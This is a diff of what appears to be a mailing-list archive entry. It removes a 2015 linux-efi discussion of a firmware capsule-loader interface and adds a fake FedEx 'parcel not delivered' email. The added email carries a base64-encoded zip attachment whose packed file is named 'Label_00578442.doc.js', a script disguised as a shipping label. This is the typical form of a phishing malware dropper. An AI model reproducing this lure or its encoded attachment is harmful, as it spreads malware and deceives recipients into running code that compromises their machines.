@@ -1,75 +1,117 @@
-From: Roy Franz <roy.franz-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>
-Subject: Re: [PATCH v4 2/2] efi: an sysfs interface for user to update efi firmware
-Date: Wed, 15 Apr 2015 17:19:09 -0700
-Message-ID: <CAFECyb-bthi74VwkF8fpZg8ZpoyORmE5X+8dbRGG1uTP8RUm_A@mail.gmail.com>
-References: <1429004697-28320-1-git-send-email-hock.leong.kweh@intel.com>
-	<1429004697-28320-3-git-send-email-hock.leong.kweh@intel.com>
-	<20150414140914.GE5989@kroah.com>
-	<CALCETrWeW8Gp9QFGCVhPmNo_Z+xsCJN7LYMPD6XNc92_dKMz3g@mail.gmail.com>
-	<20150415132000.GD21491@kroah.com>
-	<CALCETrWUTjTLmwPZAwXrj06SwYaSX_7+XSTsVun2+HYC4wsqZQ@mail.gmail.com>
+From: "FedEx 2Day A.M." <zachary.ratliff-72P3pHeUdnGO6eJ4CTCPWL0Ud+EcFu5g@public.gmane.org>
+Subject: Problem with parcel shipping, ID:00578442
+Date: Thu, 16 Apr 2015 00:59:45 +0100
+Message-ID: <df962628c8a0eadbe82daaa38156ab7f@whileandmatthews.co.uk>
+Reply-To: "FedEx 2Day A.M." <zachary.ratliff-72P3pHeUdnGO6eJ4CTCPWL0Ud+EcFu5g@public.gmane.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: multipart/mixed;
+	boundary="b1_8b46f1d43e3b5d0a2a2c69aa4daa5688"
+Content-Transfer-Encoding: 8bit
 Return-path: <linux-efi-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-In-Reply-To: <CALCETrWUTjTLmwPZAwXrj06SwYaSX_7+XSTsVun2+HYC4wsqZQ-JsoAwUIsXosN+BqQ9rBEUg@public.gmane.org>
 Sender: linux-efi-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org>
-Cc: Greg KH <gregkh-hQyY1W1yCW8ekmWlsbkhG0B+6BGkLq7r@public.gmane.org>, Borislav Petkov <bp-Gina5bIWoIWzQB+pC5nmwQ@public.gmane.org>, Matt Fleming <matt-HNK1S37rvNbeXh+fF434Mdi2O/JbrIOy@public.gmane.org>, Ong Boon Leong <boon.leong.ong-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>, "linux-efi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-efi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Sam Protsenko <semen.protsenko-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>, "Kweh, Hock Leong" <hock.leong.kweh-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>, LKML <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Peter Jones <pjones-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, Ming Lei <ming.lei-Z7WLFzj8eWMS+FvcfC7Uqw@public.gmane.org>
+To: linux-efi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-Id: linux-efi@vger.kernel.org
 
-On Wed, Apr 15, 2015 at 8:45 AM, Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org> wrote:
-> On Apr 15, 2015 6:20 AM, "Greg Kroah-Hartman"
-> <gregkh-hQyY1W1yCW8ekmWlsbkhG0B+6BGkLq7r@public.gmane.org> wrote:
->>
->> On Tue, Apr 14, 2015 at 11:52:48AM -0400, Andy Lutomirski wrote:
->> > On Tue, Apr 14, 2015 at 10:09 AM, Greg Kroah-Hartman
->> > <gregkh-hQyY1W1yCW8ekmWlsbkhG0B+6BGkLq7r@public.gmane.org> wrote:
->> > > On Tue, Apr 14, 2015 at 05:44:56PM +0800, Kweh, Hock Leong wrote:
->> > >> From: "Kweh, Hock Leong" <hock.leong.kweh-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>
->> > >>
->> > >> Introducing a kernel module to expose capsule loader interface
->> > >> for user to upload capsule binaries. This module leverage the
->> > >> request_firmware_direct_full_path() to obtain the binary at a
->> > >> specific path input by user.
->> > >>
->> > >> Example method to load the capsule binary:
->> > >> echo -n "/path/to/capsule/binary" > /sys/devices/platform/efi_capsule_loader/capsule_loader
->> > >
->> > > Ick, why not just have the firmware file location present, and copy it
->> > > to the sysfs file directly from userspace, instead of this two-step
->> > > process?
->> >
->> > Because it's not at all obvious how error handling should work in that case.
->>
->> I don't understand how the error handling is any different.  The kernel
->> ends up copying the data in through the firmware interface both ways, we
->> just aren't creating yet-another-firmware-path in the system.
->
-> If I run uefi-update-capsule foo.bin, I want it to complain if the
-> UEFI call fails.  In contrast, if I boot and my ath10k firmware is
-> bad, there's no explicit user interaction that should fail; instead I
-> have no network device and I get to read the logs and figure out why.
-> IOW bad volatile device firmware is just like a bad device driver,
-> whereas bad UEFI capsules are problems that should be reported to
-> whatever tried to send them to UEFI.
->
-> --Andy
->
-There are several types of errors that can be returned by
-UpdateCapsule(), allowing
-us to distinguish between capsules that are not supported by the
-platform, capsules
-that must be updated at boot time, and capsule updates that failed due
-to a device error.
-I think we really do want this type of information returned to capsule loader.
+--b1_8b46f1d43e3b5d0a2a2c69aa4daa5688
+Content-Type: text/plain; charset=us-ascii
 
-Roy
+Dear Customer,
 
->>
->> thanks,
->>
->> greg k-h
-> --
-> To unsubscribe from this list: send the line "unsubscribe linux-efi" in
-> the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
+We could not deliver your parcel.
+Shipment Label is attached to this email.
+
+Regards,
+Zachary Ratliff,
+Sr. Station Manager.
+
+
+--b1_8b46f1d43e3b5d0a2a2c69aa4daa5688
+Content-Type: application/zip; name="Label_00578442.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Label_00578442.zip
+
+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
+BQYAAAAAAQABAEMAAADEEQAAAAA=
+
+
+--b1_8b46f1d43e3b5d0a2a2c69aa4daa5688--
